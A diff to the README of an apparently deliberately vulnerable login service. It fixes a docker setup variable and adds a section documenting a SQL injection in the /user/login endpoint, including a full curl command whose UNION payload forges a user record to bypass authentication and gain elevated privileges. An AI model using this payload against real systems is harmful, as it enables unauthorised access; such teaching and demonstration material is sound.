@@ -11,7 +11,7 @@ To run it locally using docker, you can run:
 
 ```bash
 docker run --detach --name user-auth-db \
-  --env MARIADB_PASSWORD=mariadb-root-password \
+  --env MARIADB_ROOT_PASSWORD=mariadb-root-password \
   --env MARIADB_DATABASE=my_database \
    -p 3306:3306 \
    mariadb:latest
@@ -49,3 +49,12 @@ When developing, to have the server auto-restart on change of a file and use loc
 ```
 yarn run dev
 ```
+
+### Exploiting the sql injection vulnerability
+
+The `/user/login` endpoint is vulnerable to SQL injection attacks. To exploit this vulnerability pass the injection in the `username` parameter.
+
+This example tries to get elevated privileges while bypassing the user authentication. We ignore the actual query result and return a fake
+record, which is then used to query matching roles and generate a token with more privileges then we actually have.
+
+`curl -vvv -H 'Content-Type: application/json' -d '{ "username":"\" OR 1 = 0 UNION ALL SELECT \"user\", \"$2b$10$y5LKMIUxQO8B0CllON63UunVV3xEdRxfHQ3Ocy1SUd6fbxgFxJe1u\", 1  FROM DUAL#","password":"user"}' -X POST  http://127.0.0.1:9091/user/login`
